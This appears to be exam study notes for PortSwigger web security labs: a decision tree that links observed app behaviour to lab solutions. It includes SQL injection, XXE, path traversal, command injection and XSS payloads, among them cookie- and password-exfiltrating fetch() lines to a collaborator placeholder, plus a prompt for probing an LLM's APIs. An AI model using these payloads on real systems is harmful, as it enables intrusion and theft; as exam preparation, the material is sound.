
## Shop 🛍️
### Authenticated Shop
#### Add to Cart 🛒
##### Change Email
- Coupon field 
	- [[Business logic vulnerabilities#1/2.1.Lab Excessive trust in client-side controls ⭕️]]
	- [[Business logic vulnerabilities#x.2. Lab High-level logic vulnerability ⭕️]]
	- [[Business logic vulnerabilities#x.8. Lab Insufficient workflow validation ⭕️]]
	- `PROMO20` promo code
		- [[Race conditions#x.1. Lab Limit overrun race conditions ⭕️]]
	- `NEWCUST5` promo code
		- [[Business logic vulnerabilities#x.4.Lab Flawed enforcement of business rules ⭕️]]
	- Change email > "Please click the link in your email to confirm the change of e-mail..."
		- [[Race conditions#2.4. Lab Single-endpoint race conditions ⭕️]]
- Checkout > `chosen_discount` in `GET /api/checkout`
	- [[API Testing#2.4. Lab Exploiting a mass assignment vulnerability ⭕️]]


#### Check stock ❌
- `GET /` 
	- `Host: www.hacker.com`
		- "Client Error: Forbidden"
			- [[SSRF#1.x. Lab SSRF via flawed request parsing ⭕️]]

##### Comment in Page Source
- `CustomTemplate.php`
	- [[Deserialization#3.4. Lab Arbitrary object injection in PHP ⭕️]]
- `/admin-*******`
	- [[Access Control#2.2. Lab Unprotected admin functionality with unpredictable URL ⭕️]]

##### `/.git`
- [[Content Discovery#1.5. Lab Information disclosure in version control history ⭕️]]

##### `/robots.txt`
- `Disallow: /administrator-panel`
	- [[Access Control#2.1. Lab Unprotected admin functionality ⭕️]]

##### `/admin`
- Register button
	- "Admin interface only available if logged in as a DontWannaCry user"
		- [[Authentication#1.x. Lab Inconsistent handling of exceptional input ⭕️]]
		- [[Business logic vulnerabilities#2.3.Lab Inconsistent security controls ⭕️]]
- "Admin interface only available to local users"
	- [[Content Discovery#1.4. Lab Authentication bypass via information disclosure ⭕️]]
	- [[Host Headers#1.2. Lab Host header authentication bypass ⭕️]]
- "Admin interface only available if logged in as an administrator"
	- Login as `wiener:peter`
		- `Admin=false` cookie
			- [[Access Control#2.3. Lab User role controlled by request parameter ⭕️]]
		- `roleid` in `POST /my-account/change-email` 
			- [[Access Control#2.4. Lab User role can be modified in user profile ⭕️]]

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- `Host` to `example.com`
		- 301 Moved Permanently
			- [[Host Headers#1.6. Lab Host validation bypass via connection state attack ⭕️]]
		- 504 Gateway Timeout
			-  [[Host Headers#1.4. Lab Routing-based SSRF ⭕️]]
		- 421 Misdirected Request
			- `username=administrator'--`  == 302 Found
				- [[SQLi#2.2. Lab SQL injection vulnerability allowing login bypass ⭕️]]
	- `X-Cache`
		- <sup>Param Miner: Guess headers</sup> `X-Forwarded-Host` value reflected in response
			- [[Web Cache Poisoning#1.1. Lab Web cache poisoning with an unkeyed header ⭕️]]
		- <sup>Param Miner: Guess headers</sup> `X-Forwarded-Host` + `X-Forwarded-Scheme`
			- [[Web Cache Poisoning#1.3. Lab Web cache poisoning with multiple headers ⭕️]]
		- `fehost` cookie reflected in response
			- [[Web Cache Poisoning#1.2. Lab Web cache poisoning with an unkeyed cookie ⭕️]]
		- 2nd `Host` header reflected in response
			- [[Web Cache Poisoning#1.x. Lab Web cache poisoning via ambiguous requests ⭕️]]
	- Admin panel or `/admin` = "Access denied"
		- [[Access Control#2.10. Lab URL-based access control can be circumvented ⭕️]]


##### Change Address
>Remember to add a comma `,` after the previous key:value pair
```
"__proto__": { "foo":"bar" }
```
- `"foo":"bar"` reflected in response
	- [[Server side#2 6 Lab Privilege escalation via server-side prototype pollution ⭕️]]
	- [[Server side#3.9. Lab Remote code execution via server-side prototype pollution ⭕️]]
- `"foo":"bar"` *doesn't* reflect in response
	- [[Server side#2.7. Lab Detecting server-side prototype pollution without polluted property reflection ⭕️]]
	- [[Server side#2.8. Lab Bypassing flawed input filters for server-side prototype pollution ⭕️]]


##### Change Email
- Decoded `session` cookie = `0:4` = PHP serialized object
	- [[Deserialization#3.1. Lab Modifying serialized objects ⭕️]]
	- [[Deserialization#3.2. Lab Modifying serialized data types ⭕️]]
- `session` cookie = `rO0AB` = Java serialized object
	- [[Deserialization#3.5. Lab Exploiting Java deserialization with Apache Commons ⭕️]]
- `session cookie`= `%7B%22token`
	- [[Deserialization#3.6. Lab Exploiting PHP deserialization with a pre-built gadget chain ⭕️]]
- `GET /my-account?id={USERNAME}` > Passive scan selected message > `serialized Ruby object using Marshal`
	- [[Deserialization#3.7. Lab Exploiting Ruby deserialization using a documented gadget chain ⭕️]]
- Creds: `content-manager:C0nt3ntM4n4g3r`
	- Product > Edit template has this syntax: `${someExpression}`
		- [[SSTI#3.3. Lab Server-side template injection using documentation ⭕️]]
		- [[SSTI#3.5. Lab Server-side template injection with information disclosure via user-supplied objects ⭕️]]
- Creds: `administrator:admin`
	- **Open private window > login as wiener then run:** `GET /admin-roles?username=wiener&action=upgrade`
		- 302 Found
			- [[Access Control#2.11. Lab Method-based access control can be circumvented ⭕️]]
		- 401 Unauthorized
			- [[Access Control#2.13. Lab Referer-based access control ⭕️]]
	- `confirmed=true` in `POST /admin-roles`
		- [[Access Control#2.12. Lab Multi-step process with no access control on one step ⭕️]]
- `/api`
	- 200 OK
		- [[API Testing#2.1. Lab Exploiting an API endpoint using documentation ⭕️]]
	- 400 Bad Request: "Query not present"
		- [[GraphQL Endpoints#2.3. Lab Finding a hidden GraphQL endpoint ⭕️]]
- `GET /accountDetails`
	- `Access-Control-Allow-Credentials: true`
		- [[Burp Exam Notes/Stage 2/CORS#2.1. Lab CORS vulnerability with basic origin reflection ⭕️]]
		- [[Burp Exam Notes/Stage 2/CORS#2.2. Lab CORS vulnerability with trusted null origin ⭕️]]
- `/my-account?id={USERNAME}`
	- `id={USERNAME}`
		- [[Access Control#2.5. Lab User ID controlled by request parameter ⭕️]]
		- [[Access Control#2.7. Lab User ID controlled by request parameter with data leakage in redirect ⭕️]]

##### Change Password + Change Email
- Password field: `*****`
	- [[Access Control#2.8. Lab User ID controlled by request parameter with password disclosure ⭕️]]

##### Forgot password?
- Cannot login
	- `administrator` == 200 OK
		- [[API Testing#2.2. Lab Exploiting server-side parameter pollution in a query string ⭕️]]

##### Filter Categories
- `TrackingId` cookie + add `'` to it
	- 200 OK
		- "Welcome back!"
			- [[Blind SQLi#2.11. Lab Blind SQL injection with conditional responses ⭕️]]
		-  `'||+(SELECT+pg_sleep(10))--` == ~10sec response
			- [[Blind SQLi#2.14. Lab Blind SQL injection with time delays ⭕️]]
			- [[Blind SQLi#2.15. Lab Blind SQL injection with time delays and information retrieval ⭕️]]
		- [[Blind SQLi#2.16. Lab Blind SQL injection with out-of-band interaction ⭕️]]
		- [[Blind SQLi#2.17. Lab Blind SQL injection with out-of-band data exfiltration ⭕️]]
	- 500 Internal Server Error
		- `'--` added to the cookie == 200 OK
			- [[SQLi#2.13. Lab Visible error-based SQL injection ⭕️]]
			- [[Blind SQLi#2.12. Lab Blind SQL injection with conditional errors ⭕️]]
-  `'+order+by+1--`
	- 200 OK
		- `POST /login` uses `Content-Type: application/json` 
			- [[NoSQL injection#2.2. Lab Exploiting NoSQL operator injection to bypass authentication ⭕️]]
			- [[NoSQL injection#1/2.4 Lab Exploiting NoSQL operator injection to extract unknown fields ⭕️]]
- "Your username is: wiener (role: user)"
	- `GET /user/lookup?user=wiener`
		- [[NoSQL injection#2.3. Lab Exploiting NoSQL injection to extract data ⭕️]]

##### Filter Categories (No Products) <sup>Only show 2 rows of text per entry</sup>
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+'abc','def'--` == 200 OK
			- [[SQLi#2.5. Lab SQL injection attack, listing the database contents on non-Oracle databases ⭕️]]
			- [[SQLi#2.9. Lab SQL injection UNION attack, retrieving data from other tables ⭕️]]
		- `'+UNION+SELECT+'abc','def'+FROM+dual--` == 200 OK
			- [[SQLi#2.6. Lab SQL injection attack, listing the database contents on Oracle ⭕️]]

##### Filter Categories (No Images)
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+NULL,NULL,NULL--`
			- 200 OK 
				- [[SQLi#2.7. Lab SQL injection UNION attack, determining the number of columns returned by the query ⭕️]]
				- [[SQLi#2.8. Lab SQL injection UNION attack, finding a column containing text ⭕️]]
			- 500 Internal Server Error
				- [[SQLi#2.10. Lab SQL injection UNION attack, retrieving multiple values in a single column ⭕️]]

##### Live Chat
- Login Attempt: `wiener:peter`
	- "Invalid username or password."
		- [[CSRF#2.9. Lab SameSite Strict bypass via sibling domain ⭕️]]
		- Ask LLM: `what apis do you have access to?`
			- `debug_sql`
				- [[Web LLM attacks#1/2.1. Lab Exploiting LLM APIs with excessive agency ⭕️]]
			- `subscribe_to_newsletter`
				- [[Web LLM attacks#3.2. Lab Exploiting vulnerabilities in LLM APIs ⭕️]]
		- Register button
			- [[Web LLM attacks#1/2.3. Lab Indirect prompt injection ⭕️]]
		- READY websocket message retrieves entire chat history + `SameSite: none`
			- [[WebSockets#1.2. Lab Cross-site WebSocket hijacking ⭕️]]
			- XSS payload (`<script>alert(1)</script>`) == `Error: Attack detected: JavaScript`
				- [[WebSockets#1.3. Lab Manipulating the WebSocket handshake to exploit vulnerabilities ⭕️]]
- View transcript button *Not sure about login attempt message*
	- `GET /download-transcript/{INTEGER}.txt`
		- [[Access Control#2.9. Lab Insecure direct object references ⭕️]]

##### Please select a role
- `/admin`
	- "Admin interface only available if logged in as an administrator"
		- [[Business logic vulnerabilities#2.9. Lab Authentication bypass via flawed state machine ⭕️]]


#### Check stock ✅

##### Change Email
- `GET /accountDetails`
	- `Access-Control-Allow-Credentials: true`
		- [[Burp Exam Notes/Stage 2/CORS#2.3. Lab CORS vulnerability with trusted insecure protocols ⭕️]]

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- `POST /product/stock` uses XML
		- [[SQLi#2.18. Lab SQL injection with filter bypass via XML encoding ⭕️]]
	- `stockAPI` in `POST /product/stock`
		- [[SSRF#3.1. Lab Basic SSRF against the local server ⭕️]]
		- [[SSRF#3.2. Lab Basic SSRF against another back-end system ⭕️]]
		- [[SSRF#3.4. Lab SSRF with blacklist-based input filter ⭕️]]
		- [[SSRF#3.5. Lab SSRF with filter bypass via open redirection vulnerability ⭕️]]

##### Filter + Submit Feedback + Live Chat
- `jquery_1-7-1.js`
	- [[Client side#2.5. Lab Client-side prototype pollution in third-party libraries ⭕️]]

##### Change Email + Gift Card
- [[Authentication#1.x. Lab Infinite money logic flaw ⭕️]]



---
### Unauthenticated Shop
#### Check stock ❌
- `GET /image?filename=../../../etc/passwd`
	- 200 OK
		- [[LFI#3.1. Lab File path traversal, simple case ⭕️]]
	- "No such file"
		- [[LFI#3.2. Lab File path traversal, traversal sequences blocked with absolute path bypass ⭕️]]
		- [[LFI#3.3. Lab File path traversal, traversal sequences stripped non-recursively ⭕️]]
		- [[LFI#3.4. Lab File path traversal, traversal sequences stripped with superfluous URL-decode ⭕️]]
		- [[LFI#3.6. Lab File path traversal, validation of file extension with null byte bypass ⭕️]]
	- "Missing parameter 'filename'"
		- [[LFI#3.5. Lab File path traversal, validation of start of path ⭕️]]
- `GET /product?productId=1` set `Referer` to Burp Collaborator
	- [[SSRF#3.3. Lab Blind SSRF with out-of-band detection ⭕️]]
- `GET /?message=Unfortunately...`  after clicking on View details
	- `<%25%3d+7*7+%25>`
		- 49 in response
			- [[SSTI#3.1. Lab Basic server-side template injection ⭕️]]
		- `7*7` in response
			- [[SSTI#3.4. Lab Server-side template injection in an unknown language with a documented exploit ⭕️]]
- `GET /product?productId=a`
	- Apache Struts 2 2.3.31
		- [[Content Discovery#1.1 Lab Information disclosure in error messages ⭕️]]

##### Comment in Page Source
- `phpinfo.php`
	- [[Content Discovery#1.2. Lab Information disclosure on debug page ⭕️]]
- `addEventListener`
	- `JSON.parse(e.data)` 
		- [[DOM-Based XSS#1.3. Lab DOM XSS using web messages and `JSON.parse` ⭕️]]
	- `getElementById()`
		- [[DOM-Based XSS#1.1. Lab DOM XSS using web messages ⭕️]]

##### Target > Engagement tools > Search
- `lastViewedProduct`
	- [[DOM-Based XSS#1.5. Lab DOM-based cookie manipulation ⭕️]]


##### `/robots.txt`
- `/backup`
	- [[Content Discovery#1.3. Lab Source code disclosure via backup files ⭕️]]
	- 

##### Submit Feedback
- `||ping+-c+10+127.0.0.1||` 
	- takes ~10secs from response
		- [[OS Command Injection#3.2. Lab Blind OS command injection with time delays ⭕️]]
		- [[OS Command Injection#3.3. Lab Blind OS command injection with output redirection ⭕️]]
	- immediate response
		- [[OS Command Injection#3.4. Lab Blind OS command injection with out-of-band interaction ⭕️]]
		- [[OS Command Injection#3.5. Lab Blind OS command injection with out-of-band data exfiltration ⭕️]]

##### Filter Categories
- `'+order+by+1--`
	- 200 OK
		- <sup>Solve: '+OR+1=1--</sup> [[SQLi#2.1. Lab SQL injection vulnerability in WHERE clause allowing retrieval of hidden data ⭕️]]
	- 500 Internal Server Error
		- JavaScript syntax error `JSInterpreterFailure`
			- [[NoSQL injection#1/2.1. Lab Detecting NoSQL injection ⭕️]]

##### Filter Categories (No Products) <sup>Only show 2 rows of text per entry</sup>
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+'abc','def'+FROM+dual--` == 200 OK
			- [[SQLi#2.3. Lab SQL injection attack, querying the database type and version on Oracle ⭕️]] 
	- 500 Internal Server Error
		- `'+order+by+1#` == 200 OK
			- [[SQLi#2.4. Lab SQL injection attack, querying the database type and version on MySQL and Microsoft ⭕️]]



#### Check stock ✅
- `|whoami` for `storeId or productId` in `POST /product/stock` = 200 OK
	- <sup>Scan result: YES</sup> [[OS Command Injection#3.1. Lab OS command injection, simple case ⭕️]]
- XML in `POST /product/stock`
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId>
```
- -
	- Show `/etc/passwd` content
		- <sup>Scan result: YES</sup> [[XXE#3.1. Lab Exploiting XXE using external entities to retrieve files ⭕️]]
		- <sup>Scan result: YES</sup>[[XXE#3.2. Lab Exploiting XXE to perform SSRF attacks ⭕️]]
	- "Invalid product ID"
		- <sup>Scan result: YES</sup>[[XXE#3.3. Lab Blind XXE with out-of-band interaction ⭕️]]
	- "Entities are not allowed for security reasons"
		- [[XXE#3.4. Lab Blind XXE with out-of-band interaction via XML parameter entities ⭕️]]
- **No** XML in `POST /product/stock`
	- <sup>Scan result: YES</sup>[[XXE#3.7. Lab Exploiting XInclude to retrieve files ⭕️]]
- `storeId={CITY}` like *storeId=London*
	- `document.write('</select>');` in Page Source
		- [[DOM-Based XSS#1.x. Lab DOM XSS in `document.write` sink using source `location.search` inside a select element ⭕️]]


##### Submit Feedback
- XML in `POST /product/stock`
	- *Use payload above* = "Entities are not allowed for security reasons"
		- [[XXE#3.5. Lab Exploiting blind XXE to exfiltrate data using a malicious external DTD ⭕️]]
		- [[XXE#3.6. Lab Exploiting blind XXE to retrieve data via error messages ⭕️]]


##### Timer
- 10mins
	- [[Essential skills#3.1. Lab Discovering vulnerabilities quickly with targeted scanning ⭕️]]


---
---
## Blog 💻
### Authenticated Blog
#### No Comments
##### GraphQL
- "mutation"
	- [[GraphQL Endpoints#2.4. Lab Bypassing GraphQL brute force protections ⭕️]]
	- [[GraphQL Endpoints#2.5. Lab Performing CSRF exploits over GraphQL ⭕️]]


#### Only Comment Field in Blog
##### Change Preferred Name
- `}}{{7*7}}` on `blog-post-author-display` param in `POST` request
	- Tornado
		- [[SSTI#3.2. Lab Basic server-side template injection (code context) ⭕️]]

##### Change Email + Upload Avatar + Delete account button
- [[Deserialization#3. Lab Using application functionality to exploit insecure deserialization ⭕️]]

#### Every field
##### My account
- "We are now redirecting you to login with social media..."
	- [[CSRF#2.10. Lab SameSite Lax bypass via cookie refresh ⭕️]]
	- No features (no change email, etc.)
		- `POST /authenticate`
			- [[OAuth Authentication#1/2.1. Lab Authentication bypass via OAuth implicit flow ⭕️]]
			- "Next post" button on blogs
				- [[OAuth Authentication#1/2.5. Lab Stealing OAuth access tokens via an open redirect ⭕️]]
		- *NO* `POST /authenticate`
			- [[OAuth Authentication#1/2.2. Lab SSRF via OpenID dynamic client registration ⭕️]]
			- [[OAuth Authentication#1/2.4. Lab OAuth account hijacking via redirect_uri ⭕️]]
- Login with social media button
	- Social media creds: `peter.wiener:hotdog`
		- [[CSRF#2.x. Lab Forced OAuth profile linking ⭕️]]


##### Forgot password?
- `Host` to `example.com`
	- 200 OK
		- [[Host Headers#1.1 Lab Basic password reset poisoning ⭕️]]
	- 421 Misdirected Request
		- [[Host Headers#1.11 Lab Password reset poisoning via middleware ⭕️]]
- `username` in `POST /forgot-password`
	- [[Password Reset#2.5. Lab Exploiting time-sensitive vulnerabilities ⭕️]]
	- `temp-forgot-password-token`
		- [[Password Reset#2.3. Lab Password reset broken logic ⭕️]]

##### Asks for 4-digit security code
- [[Authentication#1.2. Lab 2FA simple bypass ⭕️]]
- `verify` cookie 
	- [[Authentication#1.8. Lab 2FA broken logic ⭕️]]

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- [[Authentication#1.7. Lab Username enumeration via account lock ⭕️]]
	- [[Brute Force#1.4. Lab Username enumeration via subtly different responses ⭕️]]
	- "HTML is allowed" in Blog + `x-host`
		- <sup>Param Miner: Guess headers</sup> [[Web Cache Poisoning#1.4.Lab Targeted web cache poisoning using an unknown header ⭕️]]
	- **Post Comment**
		- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
			- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to steal cookies ⭕️]]
		- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
			- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to capture passwords ⭕️]]
	- **Use HTTP Request Smuggling payload**
		- 500 Internal Server Error
			- [[CL.TE#1.3. Lab Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ⭕️]]
			- [[Others#1.6. Lab Exploiting HTTP request smuggling to capture other users' requests ⭕️]]
- "Invalid username"
	- [[Brute Force#1.1 Lab Username enumeration via different responses ⭕️]]
- Admin panel or `/admin` = "Path /admin is blocked"
	- **Use HTTP Request Smuggling payload**
		- 400 Bad Request
			- [[Others#1.x. Lab CL.0 request smuggling ⭕️]]
			- [[TE.CL#1.4. Lab Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ⭕️]]

##### Stay Logged In Checkbox
- [[Brute Force#1.9. Lab Brute-forcing a stay-logged-in cookie ⭕️]]
- No client-side validation for Email field
	- [[Business logic vulnerabilities#2.10. Lab Authentication bypass via encryption oracle ⭕️]]
- Delete account button
	- [[Brute Force#1.10. Lab Offline password cracking ⭕️]]

##### Change Email
- Invalid Login Attempts: `aaa:aaa`
	- "You have made too many incorrect login attempts. Please try again in X minute(s)."
		- [[Authentication#1.6. Lab Broken brute-force protection, IP block ⭕️]]
		- [[Brute Force#1.5. Lab Username enumeration via response timing ⭕️]]
		- [[Race conditions#1/2.2. Lab Bypassing rate limits via race conditions ⭕️]]
- `/my-account?id={GUID}`
	- [[Access Control#2.6. Lab User ID controlled by request parameter, with unpredictable user IDs ⭕️]]
- `POST /my-account/change-email`
	- No `csrf` token
		- [[CSRF#2.1. Lab CSRF vulnerability with no defenses ⭕️]]
		- [[CSRF#2.7. Lab SameSite Lax bypass via method override ⭕️]]
		- `SameSite=None`
			- [[CSRF#2.11. Lab CSRF where Referer validation depends on header being present ⭕️]]
			- [[CSRF#2.12. Lab CSRF with broken Referer validation ⭕️]]
		- `SameSite=Strict`
			- [[CSRF#2.8. Lab SameSite Strict bypass via client-side redirect ⭕️]]
	- Yes `csrf` token 
		- Content-Security-Policy
			- [[Reflected XSS#1.x. Lab Reflected XSS protected by very strict CSP, with dangling markup attack ⭕️]]
		- Remove `csrf` token
			- 302 Found
				- [[CSRF#2.2. Lab CSRF where token validation depends on request method ⭕️]]
				- [[CSRF#2.3. Lab CSRF where token validation depends on token being present ⭕️]]
			- 400 Bad Request: "Missing parameter 'csrf'"
				- [[CSRF#2.4. Lab CSRF where token is not tied to user session ⭕️]]
				- [[Stored XSS#1.x. Lab Exploiting XSS to bypass CSRF defenses ⭕️]]
				- [[Clickjacking#1/2.2. Lab Clickjacking with form input data prefilled from a URL parameter ⭕️]]
				- [[Clickjacking#1/2.3. Lab Clickjacking with a frame buster script ⭕️]]
- "Your API Key is: ..."
	- [[Web cache deception#1/2.1. Lab Exploiting path mapping for web cache deception ⭕️]]
	- `Server: Apache-Coyote/1.1`
		- [[Web cache deception#1/2.2. Lab Exploiting path delimiters for web cache deception ⭕️]]
	- Cache headers (`X-Cache`, `Age`, etc) only in `/resources`
		- Adding `.js` in `GET /my-account/aaa.js` doesn't reveal cache headers
			- [[Web cache deception#1/2.3. Lab Exploiting origin server normalization for web cache deception ⭕️]]
			- [[Web cache deception#1/2.4. Lab Exploiting cache server normalization for web cache deception ⭕️]]

##### Change Email + Delete Account
- `csrf` token
	- remove `csrf` token == 400 Bad Request
		- [[Clickjacking#1/2.1. Lab Basic clickjacking with CSRF token protection ⭕️]]
		- [[Clickjacking#1/2.5. Lab Multistep clickjacking ⭕️]]


##### Change Password + Change Email
- Remove `current-password`
	- 200 OK
		- [[Password Reset#2.7. Lab Weak isolation on dual-use endpoint ⭕️]]
	- 400 Bad Request: "Missing parameter"
		- [[Password Reset#1.12. Lab Password brute-force via password change ⭕️]]


#### Every field + File Upload in Blog
##### My account > File Upload
- After uploading `.php` file
	- `GET /.../{FILE}.php`
		- 200 OK
			- [[File Uploads#3.1. Lab Remote code execution via web shell upload ⭕️]]
			- [[File Uploads#3.3. Lab Web shell upload via path traversal ⭕️]]
		- "Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed..."
			- [[File Uploads#3.2. Lab Web shell upload via Content-Type restriction bypass ⭕️]]
	- `POST /my-account/avatar`
		- "Sorry, php files are not allowed"
			- [[File Uploads#3.4. Lab Web shell upload via extension blacklist bypass ⭕️]]
		- "Sorry, only JPY & PNG files are allowed"
			- [[File Uploads#3.5. Lab Web shell upload via obfuscated file extension ⭕️]]
		- "Error: file is not a valid image"
			- [[File Uploads#3.6. Lab Remote code execution via polyglot web shell upload ⭕️]]

#### Search Bar
##### `/admin`
- "Admin interface only available if logged in as an administrator"
	- JWT
		- <sup>Scan result: YES</sup>[[JWT#2.1. Lab JWT authentication bypass via unverified signature ⭕️]]
		- <sup>Scan result: YES</sup> [[JWT#2.2. Lab JWT authentication bypass via flawed signature verification ⭕️]]
		- <sup>JWT is smaller</sup> [[JWT#2.3. Lab JWT authentication bypass via weak signing key ⭕️]]
		- <sup>Scan result: YES</sup> [[JWT#2.4. Lab JWT authentication bypass via jwk header injection ⭕️]]
		- <sup>Scan result: YES</sup> [[JWT#2.5. Lab JWT authentication bypass via jku header injection ⭕️]]
		- [[JWT#2.6. Lab JWT authentication bypass via kid header path traversal ⭕️]]

##### Change Email
- `POST /my-account/change-email`
	- No `csrf` token
		- -
	- Yes `csrf` token 
		- Remove `csrf` token
			- 400 Bad Request: 
				- "Invalid CSRF token"
					- [[CSRF#2.5. Lab CSRF where token is tied to non-session cookie ⭕️]]
				- "Missing parameter 'csrf'"
					- [[Essential skills#1/2.2. Lab Scanning non-standard data structures ⭕️]]
		- `csrf` cookie
			- [[CSRF#2.6. Lab CSRF where token is duplicated in cookie ⭕️]]

##### Submit Feedback
- `searchLoggerConfigurable.js`
	- `config.transport_url`
		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.1. Lab Client-side prototype pollution via browser APIs ⭕️]]
- `searchLogger.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.2. Lab DOM XSS via client-side prototype pollution ⭕️]]
- `searchLoggerFiltered.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.4. Lab Client-side prototype pollution via flawed sanitization ⭕️]]
- `jquery_3-0-0.js`
	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [[Client side#2.3. Lab DOM XSS via an alternative prototype pollution vector ⭕️]]


##### Use the HTTP Request Smuggling Payload
- 400 Bad Request -- "Both chunked encoding and content-length were specified"
	- Cannot login
		- [[HTTP2#1.8. Lab Response queue poisoning via H2.TE request smuggling ⭕️]]
		- [[HTTP2#1.11. Lab HTTP/2 request splitting via CRLF injection ⭕️]]
	- Can login
		- [[HTTP2#1.10. Lab HTTP/2 request smuggling via CRLF injection ⭕️]]
		
- 500 Internal Server Error -- "Server Error: Communication timed out"
	- Can login
		- [[Others#1.5. Lab Exploiting HTTP request smuggling to reveal front-end request rewriting ⭕️]]


---
### Unauthenticated Blog
#### No Comments
##### GraphQL
- GraphQL Visualizer
	- `postPassword: String` in `BlogPost`
		- [[GraphQL Endpoints#2.1. Lab Accessing private GraphQL posts ⭕️]]
	- `BlogPost` + `User`
		- [[GraphQL Endpoints#2.2 Lab Accidental exposure of private GraphQL fields ⭕️]]



#### Every field + File Upload in Blog
##### Page Source
- `svg` in `<img>` tag
	- [[XXE#3.8. Lab Exploiting XXE via image file upload ⭕️]]
- `indexOf('http')` + `addEventListener`
	- [[DOM-Based XSS#1.2. Lab DOM XSS using web messages and a JavaScript URL ⭕️]]


#### Every field
##### Page Source
- `rel="canonical"`
	- [[Reflected XSS#1.x. Lab Reflected XSS in canonical link tag ⭕️]]

##### `X-Cache`
- Query string in response like `?cb=123` + `X-Cache: miss` <sup>X-Cache has to say miss and cb=123 is reflected in response</sup>
	- [[Web Cache Poisoning#1.5.Lab Web cache poisoning via an unkeyed query string ⭕️]]
	- [[Web Cache Poisoning#1.6.Lab Web cache poisoning via an unkeyed query parameter ⭕️]]
	- [[Web Cache Poisoning#1.9. Lab URL normalization ⭕️]]
- Param Miner > Guess query params > Parameter Cloaking
	- [[Web Cache Poisoning#1.7.Lab Parameter cloaking ⭕️]]
- `/js/geolocate.js?callback=setCountryCookie`
	- [[Web Cache Poisoning#1.8. Lab Web cache poisoning via a fat GET request ⭕️]]

##### Submit Feedback
- `jQuery 1.8.2`
	- `GET /feedback?returnPath=/`
		- [[DOM-Based XSS#1.5. Lab DOM XSS in jQuery anchor `href` attribute sink using `location.search` source ⭕️]]
- `csrf` token in `POST /feedback/submit`
	- [[Clickjacking#1/2.4. Lab Exploiting clickjacking vulnerability to trigger DOM-based XSS ⭕️]]

##### Target > Engagement tools > Search
- `returnUrl = /url`
	- [[DOM-Based XSS#1.4. Lab DOM-based open redirection ⭕️]]
- `html.replace`
	- [[DOM-Based XSS#1.x. Lab Stored DOM XSS ⭕️]]
- `hashchange`
	- [[DOM-Based XSS#1.x. Lab DOM XSS in jQuery selector sink using a hashchange event ⭕️]]

##### Post Comment
- Solved with `</p><script>alert(1)</script>`
	- [[Stored XSS#1.x. Lab Stored XSS into HTML context with nothing encoded ⭕️]]
- `name` field is a hyperlink
	- Solve with `javascript:alert(1)`
		- [[Stored XSS#1.x. Lab Stored XSS into anchor `href` attribute with double quotes HTML-encoded ⭕️]]
	- `website` field has client side validation
		- [[Stored XSS#1.x. Lab Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped ⭕️]]


##### Use this HTTP Request Smuggling Payload: [[Burp Exam Notes/Stage 1/HTTP Request Smuggling/README#^osmqx6]]
- 500 Internal Server Error
	- "Server Error: Communication timed out"
		- [[CL.TE#1.1. Lab HTTP request smuggling, confirming a CL.TE vulnerability via differential responses ⭕️]]
		- [[CL.TE#1.x. Lab HTTP request smuggling, basic CL.TE vulnerability ⭕️]]
		- `User-Agent` reflected in response in `GET /post?postId=`
			- [[CL.TE#1.7. Lab Exploiting HTTP request smuggling to deliver reflected XSS ⭕️]]
- 400 Bad Request
	- [[TE.CL#1.2. Lab HTTP request smuggling, confirming a TE.CL vulnerability via differential responses ⭕️]]
	- [[TE.CL#1.x. Lab HTTP request smuggling, basic TE.CL vulnerability ⭕️]]
	- [[Others#1.x. Lab CL.0 request smuggling ⭕️]]

##### "HTML is allowed"
- [[DOM-Based XSS#1.x. Lab Exploiting DOM clobbering to enable XSS ⭕️]]


#### Search Bar
##### Use the HTTP Request Smuggling Payload
- 400 Bad Request
	- "Both chunked encoding and content-length were specified"
		- [[HTTP2#1.9. Lab H2.CL request smuggling ⭕️]]

##### DOM Invader
- Inject forms > Search
	- `document.write(1)`
		- [[DOM-Based XSS#1.x. Lab DOM XSS in `document.write` sink using source `location.search` ⭕️]]
	- `element.InnerHTML(1)`
		- [[DOM-Based XSS#1.4. Lab DOM XSS in `innerHTML` sink using source `location.search` ⭕️]]
	- `element.setAttribute.href(1)` / `ng-app` / `angular 1.7.7`
		- [[DOM-Based XSS#1.x. Lab DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded ⭕️]]
	- `eval(1)`
		- [[DOM-Based XSS#1.x. Lab Reflected DOM XSS ⭕️]]

##### Enter XSS Payload
```
<script>alert(1)</script>
```
- Solved with payload
	- [[Reflected XSS#1.x. Lab Reflected XSS into HTML context with nothing encoded ⭕️]]
- `&lt;script&gt;alert(1)&lt;/script&gt;`
	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into attribute with angle brackets HTML-encoded ⭕️]]
- `var searchTerms`
	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with angle brackets HTML encoded ⭕️]]
	- [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with single quote and backslash escaped ⭕️]]
